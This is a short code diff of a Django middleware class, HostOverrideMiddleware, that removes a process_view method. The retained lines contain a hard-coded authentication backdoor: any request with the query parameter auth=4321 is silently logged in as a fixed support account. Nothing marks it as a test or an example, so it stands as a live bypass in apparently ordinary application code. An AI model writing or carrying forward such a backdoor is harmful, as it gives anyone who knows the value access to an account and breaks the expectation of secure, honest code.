@@ -77,8 +77,3 @@ class HostOverrideMiddleware:
         if request.GET.get('auth') == '4321':
             request.user = User.objects.get(email='support@place-start.ru')
         return self.get_response(request)
-    
-    def process_view(self, request, *args, **kwargs):
-        if request.GET.get('auth') == '4321':
-            return None
-        # return super().process_view(request, *args, **kwargs)
